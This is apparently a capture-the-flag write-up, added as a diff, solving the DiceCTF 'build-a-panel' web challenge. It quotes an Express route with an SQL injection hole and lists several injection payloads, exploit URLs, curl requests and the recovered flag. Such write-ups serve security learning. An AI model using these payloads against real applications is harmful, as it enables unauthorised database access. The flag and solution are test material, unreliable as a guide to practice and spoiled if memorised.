@@ -1,0 +1,51 @@
+
+## app/server.js
+app.get('/admin/debug/add_widget', async (req, res) => {
+    const cookies = req.cookies;
+    const queryParams = req.query;
+
+    if(cookies['token'] && cookies['token'] == secret_token){
+        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
+        db.run(query, (err) => {
+            if(err){
+                console.log(err);
+                res.send('something went wrong');
+            }else{
+                res.send('success!');
+            }
+        });
+    }else{
+        res.redirect('/');
+    }
+});
+
+## Can do SQLi
+INSERT INTO widgets (panelid, widgetname, widgetdata)
+VALUES (
+    'myCoolPanel',
+    'flagWidget',
+    '"' || (SELECT * FROM flag) || '"'
+);
+
+python3 create_url.py
+    https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=l3o_panel&widgetname=l3o_widget&widgetdata=%22%27%20%7C%7C%20%28SELECT%20%2A%20FROM%20flag%29%20%7C%7C%20%27%22
+
+Post payload to Admin bot
+
+curl -X POST https://build-a-panel.dicec.tf/panel/widgets -b "panelId=l3o_panel"
+    {"l3o_widget":"dice{ch41n_ChAIn_aNd_m0Re_cHaIn}"}
+
+
+
+####### Other SQLi Payload #######
+
+1.
+
+https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=l3ooo',(select flag from flag),'{"type":"a"}');#
+
+curl -X POST https://build-a-panel.dicec.tf/panel/widgets -b "panelId=l3ooo"
+    {"dice{ch41n_ChAIn_aNd_m0Re_cHaIn}":{"type":"a"}}
+
+2.
+
+https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=1b3f6724-8a5f-4cad-b127-2a13e7847752', (select flag from flag limit 1), '1');--&widgetname=1&widgetdata=1
